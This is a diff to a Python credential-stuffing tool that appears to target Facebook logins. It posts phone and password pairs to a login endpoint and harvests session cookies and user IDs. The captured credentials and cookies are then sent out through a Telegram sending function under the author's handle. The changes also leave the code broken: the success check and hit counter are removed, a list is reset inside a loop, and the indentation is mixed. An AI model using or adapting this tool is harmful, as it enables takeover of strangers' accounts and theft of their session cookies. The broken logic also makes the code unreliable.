@@ -1317,19 +1317,19 @@ def chick_Salh(phone, pas):
 	}
     response = requests.post(url, data=json.dumps(payload), headers=headers).json()
     response_str = str(response)
+	ppp = random.choice([احمر, اصفر, ازرق, بنفسجي, ابيض, سماوي, برتقالي, ذهبي, وردي])
     try:
     	idd = response.get('error', {}).get('error_data', {}).get('uid')
     except:
     	idd = ''
 
-    cookies = []
+    for cookie in response.get('session_cookies', []):
+    	cookies = []
     cookie_string = ""
     if 'session_cookies' in response:
         for cookie in response['session_cookies']:
-        	cookies.append(f"{cookie['name']}={cookie['value']}")
-    cookie_string = ';'.join(cookies)
-    if "session_key" in response_str or 'access_token' in response_str:
-        hit += 1
+            cookies.append(f"{cookie['name']}={cookie['value']}")
+        cookie_string = ';'.join(cookies)
         
         get_apps(cookie_string)
         ssend_tele(phone, pas, idd, cookie_string, apps, dates, apps2, dates2)
@@ -1370,7 +1370,7 @@ phone: {phone}
 pas: {pas}
 ID=https://www.facebook.com/profile.php?id={idd}
 DEV: @salhpy
-Brother: @r77cr
+Brother: @r77lN
 BY • https://t.me/S_S_lN
 Developer • @salhpy
 """
@@ -1391,7 +1391,7 @@ Developer • @salhpy
 
     else:
         bad += 1
-        sys.stdout.write(اعادة + f'\r{احمر}BAD ACCOUNT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ازرق} @salhpy')
+        sys.stdout.write(اعادة + f'\r{ppp}BAD ACCOUNTT | Bad {bad} | CP {CP} | Hit {hit} | {اعادة}{ازرق} @salhpy')
         sys.stdout.flush()
 tele()
 choose_country()
